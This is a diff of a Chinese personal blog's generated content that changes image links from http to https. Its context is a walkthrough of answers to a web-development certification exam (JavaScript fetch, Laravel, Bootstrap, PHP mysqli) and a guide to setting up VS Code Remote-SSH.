class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -573,45 +573,45 @@
 </blockquote>
 <h3 id="答案及解析"><a href="#答案及解析" class="headerlink" title="答案及解析"></a>答案及解析</h3><p>我是真没想到考证的 <code>ajax</code> 用的既不是 <code>XMLHTTPRequest</code> 也不是 <code>JQuery</code> 的 <code>$.ajax</code> 而是ES6中的 <code>Ferch</code></p>
 <h4 id="第-1、2-空"><a href="#第-1、2-空" class="headerlink" title="第 1、2 空"></a>第 1、2 空</h4><p>可以从42、43行中找到答案</p>
-<p><img src="http://markdown.yeek.top/20191219022618.png" alt=""></p>
-<p><img src="http://markdown.yeek.top/20191219022655.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219022618.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219022655.png" alt=""></p>
 <p>直接就是点击复选框里面的事件了，先注释掉这个点击事件，看看1、2空有没有填对。</p>
-<p><img src="http://markdown.yeek.top/20191219022950.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219022950.png" alt=""></p>
 <p>可以从 <strong>todo.php</strong> 里请求到json数据，页面显示也正常。</p>
-<p><img src="http://markdown.yeek.top/20191219023020.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219023020.png" alt=""></p>
 <h4 id="第-6-空"><a href="#第-6-空" class="headerlink" title="第 6 空"></a>第 6 空</h4><p>回到<strong>3空</strong>，不知道要 <code>new</code> 什么，后面更不知道要填什么，总之可以看出是跟后台有<strong>数据交互</strong>就对了，那就去 <strong>todo.php</strong> 里找答案。</p>
-<p><img src="http://markdown.yeek.top/20191219024139.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219024139.png" alt=""></p>
 <p>通过分析可知，修改列表需要用 <code>POST</code> 类型，同时还要用 <code>GET</code> 类型传入 <strong><code>id</code></strong> 这个值</p>
-<p><img src="http://markdown.yeek.top/20191219023856.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219023856.png" alt=""></p>
 <p>用 <code>GET</code> 传入的参数肯定是在 <code>URL</code> 里的，并且<strong>6空</strong>后面还有 <code>item.id</code> 来拼接，所以<strong>6空</strong>的答案是 <strong>?id=</strong></p>
-<p><img src="http://markdown.yeek.top/20191219024101.png" alt=""></p>
-<p><img src="http://markdown.yeek.top/20191219024732.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219024101.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219024732.png" alt=""></p>
 <h4 id="第-7、8、9-空"><a href="#第-7、8、9-空" class="headerlink" title="第 7、8、9 空"></a>第 7、8、9 空</h4><p>前面也说了，点击事件里的 <code>fetch</code> 是 <code>POST类型</code> ，根据参考资料需要用传入  <code>method: &#39;POST&#39;</code>  来指定是POST 类型</p>
-<p><img src="http://markdown.yeek.top/20191219025054.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219025054.png" alt=""></p>
 <p>显而易见不可能是7空，因为后面有 <code>data</code>，所以只能填入<strong>8、9空</strong>。你问我为什么参考（其他地方）的 <code>method</code> 没有用单引号括起来，题目里的却括起来了？咱不知道，也不敢问。</p>
-<p><img src="http://markdown.yeek.top/20191219025207.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219025207.png" alt=""></p>
 <p>那么<strong>7空</strong>毫无疑问就是 <strong>body</strong> 了</p>
-<p><img src="http://markdown.yeek.top/20191219030147.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219030147.png" alt=""></p>
 <h4 id="第-4、5-空"><a href="#第-4、5-空" class="headerlink" title="第 4、5 空"></a>第 4、5 空</h4><p>在 <strong>index.html</strong> 里又没有思路了，接着看 <strong>todo.php</strong> ，传入 <code>id</code> 之后接着干了什么。</p>
 <p>分析可知，POST传入的参数名是 <code>status</code></p>
-<p><img src="http://markdown.yeek.top/20191219030515.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219030515.png" alt=""></p>
 <p>回到 <strong>index.html</strong> 里，第37行里题目给的注释是：<strong>设置提交的参数</strong>。并且看到第35行将<strong>选中情况</strong>赋值给了常量 <code>newStatus</code>。</p>
-<p><img src="http://markdown.yeek.top/20191219030741.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219030741.png" alt=""></p>
 <p>可以大胆猜测4、5空是 <strong>status</strong> 和 <strong>newStatus</strong>，如果不信，可以接着往下看。</p>
-<p><img src="http://markdown.yeek.top/20191219031027.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219031027.png" alt=""></p>
 <h4 id="第-3-空"><a href="#第-3-空" class="headerlink" title="第 3 空"></a>第 3 空</h4><p>到现在还是不知道<strong>3空</strong>是什么，总之是用 <code>append方法</code> 添加数据的。实在不行，搜百度符合条件的就只有 <code>FormData</code> 了（具体用法见第三条参考链接）</p>
-<p><img src="http://markdown.yeek.top/20191219032447.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219032447.png" alt=""></p>
 <p>所以<strong>3空</strong>应该填的是 <strong>FormData</strong></p>
-<p><img src="http://markdown.yeek.top/20191219032525.png" alt=""></p>
-<p><img src="http://markdown.yeek.top/20191219032541.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219032525.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219032541.png" alt=""></p>
 <h4 id="第-10-空"><a href="#第-10-空" class="headerlink" title="第 10 空"></a>第 10 空</h4><p>10空根据下面那行可以判断出填的应该是 <strong>error</strong>  ，如果有 <code>error(错误信息)</code> 就用 <code>alert方法</code> 弹出错误信息。</p>
-<p><img src="http://markdown.yeek.top/20191219034348.png" alt=""></p>
-<p><img src="http://markdown.yeek.top/20191219034518.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219034348.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219034518.png" alt=""></p>
 <p>至此，第一题解析完</p>
 <h2 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h2><p>想查看题目和源码建议到本文顶部的下载中下载查看。</p>
 <p>当时忘记保存数据库文件了，所以复原不了环境。但是问题不大此题与数据库没半毛钱关系。</p>
 <p>或者是有其他问题吧</p>
-<p><img src="http://markdown.yeek.top/20191219095951.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219095951.png" alt=""></p>
 <h3 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h3><blockquote>
 <p>1 空 <a href="https://learnku.com/docs/laravel/5.7/installation/2242#52027b" target="_blank" rel="noopener">通过 Composer 创建项目</a></p>
 <p>2、3、4 空 <a href="https://learnku.com/docs/laravel/5.7/eloquent/2294#be7dce" target="_blank" rel="noopener">Model</a></p>
@@ -628,23 +628,23 @@
 
 
 <h4 id="第-2、3、4-空"><a href="#第-2、3、4-空" class="headerlink" title="第 2、3、4 空"></a>第 2、3、4 空</h4><p><strong>make:model</strong> 、 <strong>messages</strong> 、 <strong>table</strong></p>
-<p><img src="http://markdown.yeek.top/20191219090330.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219090330.png" alt=""></p>
 <h4 id="第-5、6-空"><a href="#第-5、6-空" class="headerlink" title="第 5、6 空"></a>第 5、6 空</h4><p>第 5 空是因为有前缀，并且里面还有个‘add‘，第 6 空是因为直接打开不是 post 方法</p>
 <p><strong>E</strong> 、 <strong>F</strong></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">【问题2】分析项目路由，回答下列问题，填写（5）至（6）。</span><br><span class="line"></span><br><span class="line">在浏览器中输入网址，访问留言板页面，用户填写留言内容后，点击“提交”按钮，通过POST方式提交表单，在路由文件web.php中，路由配置如下：</span><br><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;留言板首页</span><br><span class="line">Route::get(&#39;&#x2F;&#39;, &quot;IndexController@index&quot;);</span><br><span class="line">&#x2F;&#x2F;提交留言</span><br><span class="line">Route::prefix(&#39;message&#39;)-&gt;group(function ($app)&#123;</span><br><span class="line">    $app-&gt;post(&#39;add&#39;,&#39;IndexController@add&#39;);</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">项目发布在本机上，本机地址为localhost，根据web.php文件中定义的路由信息，当输入下列访问地址时，分析路由情况，选择相应A至F内容，填写（5）至（6）。</span><br></pre></td></tr></table></figure>
 
 
 
-<p><img src="http://markdown.yeek.top/20191219091052.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219091052.png" alt=""></p>
 <h4 id="第-7、8-空"><a href="#第-7、8-空" class="headerlink" title="第 7、8 空"></a>第 7、8 空</h4><p><strong>vaildata</strong> 、<strong>max</strong></p>
-<p><img src="http://markdown.yeek.top/20191219093507.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219093507.png" alt=""></p>
 <p>IndexController.php：</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Message</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $list = Message::all();</span><br><span class="line">        <span class="keyword">return</span> view(<span class="string">'index'</span>, [<span class="string">'list'</span> =&gt; $list]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $request-&gt;(<span class="number">7</span>)([     <span class="comment">/* 在此行中填写第（7）空 */</span></span><br><span class="line">            <span class="string">'name'</span>=&gt;<span class="string">'required|(8):16'</span>,    <span class="comment">/* 在此行中填写第（8）空 */</span></span><br><span class="line">            <span class="string">'content'</span>=&gt;<span class="string">'required'</span></span><br><span class="line">        ]);</span><br><span class="line">        $content = $request-&gt;get(<span class="string">'content'</span>,<span class="string">''</span>);</span><br><span class="line">        $name = $request-&gt;get(<span class="string">'name'</span>,<span class="string">''</span>);</span><br><span class="line">        $todo = <span class="keyword">new</span> Message();</span><br><span class="line">        $todo-&gt;fill([<span class="string">'name'</span>=&gt;$name,<span class="string">'content'</span>=&gt;$content]);</span><br><span class="line">        $todo-&gt;save();</span><br><span class="line">        <span class="keyword">return</span> back();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
 
 <h4 id="第-9、10空"><a href="#第-9、10空" class="headerlink" title="第 9、10空"></a>第 9、10空</h4><p><strong>@yield</strong> 、<strong>$loop-&gt;last</strong> </p>
-<p><img src="http://markdown.yeek.top/20191219093936.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219093936.png" alt=""></p>
 <p>layout.balde.php:</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Message&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        time &#123;color:<span class="comment">#666&#125;</span></span><br><span class="line">        .author &#123;color: <span class="comment">#333&#125;</span></span><br><span class="line">        fieldset &#123;margin-top:<span class="number">2</span>em&#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;header&gt;</span><br><span class="line">    &lt;h1&gt;Message board&lt;/h1&gt;</span><br><span class="line">&lt;/header&gt;</span><br><span class="line">&lt;div class="container"&gt;</span><br><span class="line">    (<span class="number">9</span>)(<span class="string">'content'</span>)    <span class="comment">/* 在此行中填写第（9）空 */</span></span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
 
@@ -662,54 +662,54 @@
 
 
 <h2 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h2><h3 id="答案及解析-2"><a href="#答案及解析-2" class="headerlink" title="答案及解析"></a>答案及解析</h3><h4 id="第-1-空-1"><a href="#第-1-空-1" class="headerlink" title="第 1 空"></a>第 1 空</h4><p>可以在 meta 的补全里看到答案</p>
-<p><img src="http://markdown.yeek.top/20191219101159.png" alt=""></p>
-<p><img src="http://markdown.yeek.top/20191219101252.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219101159.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219101252.png" alt=""></p>
 <h4 id="第-2-空"><a href="#第-2-空" class="headerlink" title="第 2 空"></a>第 2 空</h4><p><strong>flex-md-column</strong></p>
-<p><img src="http://markdown.yeek.top/20191219101738.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219101738.png" alt=""></p>
 <h4 id="第-3-、4-空"><a href="#第-3-、4-空" class="headerlink" title="第 3 、4 空"></a>第 3 、4 空</h4><p>很明显是模态框的按钮链接</p>
 <p><strong>modal</strong> 、 <strong>data-target</strong></p>
-<p><img src="http://markdown.yeek.top/20191219103351.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219103351.png" alt=""></p>
 <h4 id="第-5-空"><a href="#第-5-空" class="headerlink" title="第 5 空"></a>第 5 空</h4><p><strong>实在不知道</strong> ，百度都搜不出来，看老师给的答案是</p>
 <p><strong>modal-dialog-centered</strong></p>
-<p><img src="http://markdown.yeek.top/20191219104203.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219104203.png" alt=""></p>
 <p>话外题，百度是真的菜，搜出来的都是3的，或者自己diy的。我用Google搜，第一个就是正确答案</p>
-<p><img src="http://markdown.yeek.top/20191219215108.png" alt=""></p>
-<p><img src="http://markdown.yeek.top/20191219220040.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219215108.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219220040.png" alt=""></p>
 <h4 id="第-6、7、8"><a href="#第-6、7、8" class="headerlink" title="第 6、7、8"></a>第 6、7、8</h4><p>很明显是用了 flex 布局，根据参考链接可以知道是</p>
 <p><strong>flex-direction、column、flex-grow</strong></p>
-<p><img src="http://markdown.yeek.top/20191219110913.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219110913.png" alt=""></p>
 <h4 id="第-9-空"><a href="#第-9-空" class="headerlink" title="第 9 空"></a>第 9 空</h4><p><strong>linear-gradient</strong></p>
-<p><img src="http://markdown.yeek.top/20191219104948.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219104948.png" alt=""></p>
 <h4 id="第-10-空-1"><a href="#第-10-空-1" class="headerlink" title="第 10 空"></a>第 10 空</h4><p>看 <code>todoForm</code> ，是 form标签 ，因此可知是处理提交事件</p>
 <p><strong>submit</strong></p>
-<p><img src="http://markdown.yeek.top/20191219111516.png" alt=""></p>
-<p><img src="http://markdown.yeek.top/20191219220533.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219111516.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219220533.png" alt=""></p>
 <h4 id="第-11、12-空"><a href="#第-11、12-空" class="headerlink" title="第 11、12 空"></a>第 11、12 空</h4><p><strong>val 、 trim</strong></p>
-<p><img src="http://markdown.yeek.top/20191219220613.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219220613.png" alt=""></p>
 <h4 id="第-13-空"><a href="#第-13-空" class="headerlink" title="第 13 空"></a>第 13 空</h4><p><strong>append</strong></p>
-<p><img src="http://markdown.yeek.top/20191219220633.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219220633.png" alt=""></p>
 <h4 id="第-14-空"><a href="#第-14-空" class="headerlink" title="第 14 空"></a>第 14 空</h4><p><strong>preventDefault</strong></p>
-<p><img src="http://markdown.yeek.top/20191219114433.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219114433.png" alt=""></p>
 <h4 id="第-15-空"><a href="#第-15-空" class="headerlink" title="第 15 空"></a>第 15 空</h4><p><code>closest</code> 用的很有灵性</p>
 <p><strong>:checked</strong></p>
-<p><img src="http://markdown.yeek.top/20191219114342.png" alt=""></p>
-<h2 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h2><h4 id="第-1、2-空-1"><a href="#第-1、2-空-1" class="headerlink" title="第 1、2 空"></a>第 1、2 空</h4><p><img src="http://markdown.yeek.top/20191220010309.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219114342.png" alt=""></p>
+<h2 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h2><h4 id="第-1、2-空-1"><a href="#第-1、2-空-1" class="headerlink" title="第 1、2 空"></a>第 1、2 空</h4><p><img src="https://markdown.yeek.top/20191220010309.png" alt=""></p>
 <p>id肯定是主键和自增，这个可以不用背。直接到 phpmyadmin 里新建表，然后预览SQL语句就可以了</p>
 <p><strong>PRIMARY KEY、AUTO_INCREMENT</strong></p>
-<p><img src="http://markdown.yeek.top/20191219231942.png" alt=""></p>
-<p><img src="http://markdown.yeek.top/20191219232417.png" alt=""></p>
-<h4 id="第-3、4-空"><a href="#第-3、4-空" class="headerlink" title="第 3、4 空"></a>第 3、4 空</h4><p><img src="http://markdown.yeek.top/20191220010328.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219231942.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219232417.png" alt=""></p>
+<h4 id="第-3、4-空"><a href="#第-3、4-空" class="headerlink" title="第 3、4 空"></a>第 3、4 空</h4><p><img src="https://markdown.yeek.top/20191220010328.png" alt=""></p>
 <p>mysqli是个连接数据库的对象</p>
 <blockquote>
 <p><a href="https://www.php.net/manual/zh/mysqli.construct.php" target="_blank" rel="noopener">mysqli::__construct</a></p>
 </blockquote>
 <p><strong>new、password</strong></p>
-<p><img src="http://markdown.yeek.top/20191219232858.png" alt=""></p>
-<h4 id="第-5、6-空-1"><a href="#第-5、6-空-1" class="headerlink" title="第 5、6 空"></a>第 5、6 空</h4><p><img src="http://markdown.yeek.top/20191220010531.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219232858.png" alt=""></p>
+<h4 id="第-5、6-空-1"><a href="#第-5、6-空-1" class="headerlink" title="第 5、6 空"></a>第 5、6 空</h4><p><img src="https://markdown.yeek.top/20191220010531.png" alt=""></p>
 <p>这两空就是白送分</p>
 <p><strong>session_start()、$query</strong></p>
-<p><img src="http://markdown.yeek.top/20191219234117.png" alt=""></p>
-<h4 id="第-7、8、9-空-1"><a href="#第-7、8、9-空-1" class="headerlink" title="第 7、8、9 空"></a>第 7、8、9 空</h4><p><img src="http://markdown.yeek.top/20191220010602.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191219234117.png" alt=""></p>
+<h4 id="第-7、8、9-空-1"><a href="#第-7、8、9-空-1" class="headerlink" title="第 7、8、9 空"></a>第 7、8、9 空</h4><p><img src="https://markdown.yeek.top/20191220010602.png" alt=""></p>
 <p>第 7 空是填标识符，因为默认是 <code>MYSQLI_BOTH</code> 而题目让你填一个，并且结合短标签里指定了 <code>id</code> 还好 <code>HbuildX</code> 里有补全提示，只要记住前面的 <code>MYSQLI</code> 就行了</p>
 <p><strong>MYSQLI_ASSOC</strong></p>
 <table>
@@ -734,43 +734,43 @@
 </tbody></table>
 <p>第 11 行的编号后面的期刊名，和第 1、2 空创建<strong>表的字段名</strong>，第 8 空是</p>
 <p><strong>$row[‘title’]</strong></p>
-<p><img src="http://markdown.yeek.top/20191220004635.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191220004635.png" alt=""></p>
 <p>最后要关闭数据库连接</p>
 <p><strong>close()</strong></p>
-<p><img src="http://markdown.yeek.top/20191220004926.png" alt=""></p>
-<h4 id="第-10、11-空"><a href="#第-10、11-空" class="headerlink" title="第 10、11 空"></a>第 10、11 空</h4><p><img src="http://markdown.yeek.top/20191220010414.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191220004926.png" alt=""></p>
+<h4 id="第-10、11-空"><a href="#第-10、11-空" class="headerlink" title="第 10、11 空"></a>第 10、11 空</h4><p><img src="https://markdown.yeek.top/20191220010414.png" alt=""></p>
 <p>两个送分题，<code>ACTION</code> 指定表单提交的地址， <code>onsubmit</code> 指定提交时处理的JavaScript方法，而这个页面就一个JavaScript方法</p>
 <p><strong>postAdd.php、checkpost()</strong></p>
-<p><img src="http://markdown.yeek.top/20191220005801.png" alt=""></p>
-<h4 id="第-12、13、14-空"><a href="#第-12、13、14-空" class="headerlink" title="第 12、13、14 空"></a>第 12、13、14 空</h4><p><img src="http://markdown.yeek.top/20191220010628.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191220005801.png" alt=""></p>
+<h4 id="第-12、13、14-空"><a href="#第-12、13、14-空" class="headerlink" title="第 12、13、14 空"></a>第 12、13、14 空</h4><p><img src="https://markdown.yeek.top/20191220010628.png" alt=""></p>
 <p>因为在第 5 行用了之前在 <strong>conn.php</strong> 创建的 <code>$mysqli</code> 所以是第 12 空是</p>
 <p><strong>include ‘conn.php’</strong> 不唯一，使用 <code>include_once</code> / <code>requrire</code> / <code>requrire_once</code> 都可以</p>
 <p>需要验证是否有 <code>$_POST</code> 参数，所以第 13 空是</p>
 <p><strong>isset</strong></p>
 <p>第 14 空明显是MySQL插入数据，所以是</p>
 <p>*<em>INSERT INTO *</em></p>
-<p><img src="http://markdown.yeek.top/20191220010841.png" alt=""></p>
-<h4 id="第-15、16-空"><a href="#第-15、16-空" class="headerlink" title="第 15、16 空"></a>第 15、16 空</h4><p><img src="http://markdown.yeek.top/20191220011642.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191220010841.png" alt=""></p>
+<h4 id="第-15、16-空"><a href="#第-15、16-空" class="headerlink" title="第 15、16 空"></a>第 15、16 空</h4><p><img src="https://markdown.yeek.top/20191220011642.png" alt=""></p>
 <p>在 <strong>list.php</strong> 里用 <code>get方法</code> 传入了 <code>id</code></p>
-<p><img src="http://markdown.yeek.top/20191220012239.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191220012239.png" alt=""></p>
 <p>所以第 15 空填入</p>
 <p><strong>$_GET[‘id’]</strong></p>
 <p>第 16 空根据 <code>name</code> 可以知道是与 <code>id</code> 有关，参照下面的短连接，所以填</p>
 <p><strong>&lt;?=$rs[‘id’]&gt;</strong></p>
-<p><img src="http://markdown.yeek.top/20191220011710.png" alt=""></p>
-<h4 id="第-17、18-空"><a href="#第-17、18-空" class="headerlink" title="第 17、18 空"></a>第 17、18 空</h4><p><img src="http://markdown.yeek.top/20191220020049.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191220011710.png" alt=""></p>
+<h4 id="第-17、18-空"><a href="#第-17、18-空" class="headerlink" title="第 17、18 空"></a>第 17、18 空</h4><p><img src="https://markdown.yeek.top/20191220020049.png" alt=""></p>
 <p>第 17 空明显是更新数据，所以是</p>
 <p>*<em>UPDATA journal SET *</em></p>
 <p>当第 4 行的 <code>query</code> 执行成功，会返回数据给 <code>$result</code> 因此第 18 空就是来判这个的</p>
 <p><strong>$result</strong></p>
-<p><img src="http://markdown.yeek.top/20191220020212.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191220020212.png" alt=""></p>
 <h4 id="第-19-空"><a href="#第-19-空" class="headerlink" title="第 19 空"></a>第 19 空</h4><p>送分</p>
 <p><strong>$id</strong></p>
-<p><img src="http://markdown.yeek.top/20191220015933.png" alt=""></p>
-<h4 id="第-20-空"><a href="#第-20-空" class="headerlink" title="第 20 空"></a>第 20 空</h4><p><img src="http://markdown.yeek.top/20191220020623.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191220015933.png" alt=""></p>
+<h4 id="第-20-空"><a href="#第-20-空" class="headerlink" title="第 20 空"></a>第 20 空</h4><p><img src="https://markdown.yeek.top/20191220020623.png" alt=""></p>
 <p>又是一道送分题</p>
 <p><strong>$url</strong></p>
-<p><img src="http://markdown.yeek.top/20191220020710.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191220020710.png" alt=""></p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>怎么说呢，可能是没有接触过 <code>ES6</code> 标准的 JavaScript，总体来说四道题第一道题是最难的，越往后面做题目越简单。</p>
 <p>虽然有些题目的空没有见过是真的填不出来的，但是也有几个空是送分的，有的是需要结合上下文推断出来的。</p>
 <p>对于我本人来说，这次考证非常悬，因为第一场理论的知识点我根本没有背过，就真的纯靠蒙了。唯一擅长的操作题又不给文档，也有大几率遇到不会的、没想到的方法。总而言之就是：</p>
@@ -794,7 +794,7 @@
 
 
 
-<p><img src="http://markdown.yeek.top/20191218232943.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191218232943.png" alt=""></p>
 ]]></content>
       <categories>
         <category>oam</category>
@@ -820,9 +820,9 @@
 
 
 
-<p><img src="http://markdown.yeek.top/20191217235619.png" alt=""></p>
-<p><img src="http://markdown.yeek.top/20191217235918.png" alt=""></p>
-<p><img src="http://markdown.yeek.top/20191218000029.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191217235619.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191217235918.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191218000029.png" alt=""></p>
 ]]></content>
       <categories>
         <category>mix</category>
@@ -864,13 +864,13 @@
 
 <h2 id="VS-Code-远程连接"><a href="#VS-Code-远程连接" class="headerlink" title="VS Code 远程连接"></a>VS Code 远程连接</h2><p>首先，<code>VS Code</code> 需要安装相应的插件</p>
 <p>Remote - SSH <a href="https://marketplace.visualstudio.com/items?itemName=ms-vscode-remote.remote-ssh" target="_blank" rel="noopener">介绍页面</a></p>
-<p><img src="http://markdown.yeek.top/20191213004459.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191213004459.png" alt=""></p>
 <p>在左侧栏会多出一个按钮，进入后点击设置按钮</p>
-<p><img src="http://markdown.yeek.top/20191213004423.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191213004423.png" alt=""></p>
 <p>这里选择用户名下的 <code>.ssh</code> 文件夹，因为这台电脑的其他用户不需要远程连接。</p>
-<p><img src="http://markdown.yeek.top/20191213004555.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191213004555.png" alt=""></p>
 <p>然后在 <code>config</code> 文件中填写远程连接的信息</p>
-<p><img src="http://markdown.yeek.top/20191213010851.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191213010851.png" alt=""></p>
 <table>
 <thead>
 <tr>
@@ -892,11 +892,11 @@
 </tr>
 </tbody></table>
 <p>之后点击这个进行远程连接了</p>
-<p><img src="http://markdown.yeek.top/20191213012146.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191213012146.png" alt=""></p>
 <p>连接成功后，就可以选择打开服务器上的文件夹了</p>
-<p><img src="http://markdown.yeek.top/20191213012821.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191213012821.png" alt=""></p>
 <h2 id="使用秘钥登录"><a href="#使用秘钥登录" class="headerlink" title="使用秘钥登录"></a>使用秘钥登录</h2><p>如果你没有使用秘钥登录，则每次连接服务器的时候都需要输入密码，比如重启和更换目录。</p>
-<p><img src="http://markdown.yeek.top/20200209200607.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20200209200607.png" alt=""></p>
 <div class="note info">
             <p>关于登录秘钥的设置可以参考下面这篇文章</p><blockquote><p><a href="/post/1528.html">CentOS 使用秘钥登录</a></p></blockquote>
           </div>
@@ -905,9 +905,9 @@
 
 <h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><h3 id="缓存认证"><a href="#缓存认证" class="headerlink" title="缓存认证"></a>缓存认证</h3><p>第一次远程连接会询问你是否保存认证缓存，直接选第一个就行了</p>
 <h3 id="连接报错"><a href="#连接报错" class="headerlink" title="连接报错"></a>连接报错</h3><p>我遇到了 Bad owner or permissions on C:\Users\Administrator/.ssh/config 报错的问题，解决办法就是将 <code>config</code> 文件的路径写在 <code>Remote-ssh</code> 插件的 <code>Config File</code> 属性里，然后<strong>重启vscode</strong></p>
-<p><img src="http://markdown.yeek.top/20191213012014.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191213012014.png" alt=""></p>
 <p>之后我还是遇到了这种问题，实在被烦到不行，在设置中换成了 <code>Git</code> 的 <code>ssh</code></p>
-<p><img src="http://markdown.yeek.top/20191218004612.png" alt=""></p>
+<p><img src="https://markdown.yeek.top/20191218004612.png" alt=""></p>
 <h3 id="使用私钥登录"><a href="#使用私钥登录" class="headerlink" title="使用私钥登录"></a>使用私钥登录</h3><p>如果不指定私钥的地址，就需要在每次远程连接时输入密码，这是一件非常麻烦的事情。如何在服务器里开启私钥登录，可以去菜鸟教程里了解</p>
 <div class="note info">
             <p>《<a href="https://www.runoob.com/w3cnote/set-ssh-login-key.html" target="_blank" rel="noopener">设置 SSH 通过密钥登录</a>》</p>
@@ -992,13 +992,13 @@
 <p>实体机系统：Windows 1903</p>
 <p>虚拟机系统：Windows 7 </p>
 <h2 id="VMware-设置"><a href="#VMware-设置" class="headerlink" title="VMware 设置"></a>VMware 设置</h2><p>首先打开 <strong>虚拟机网络编辑机</strong></p>
-<p><img src="http://markdown.yeek.top/bolg/20191030/wlYrcC9BacsH.png?imageslim" alt="mark"></p>
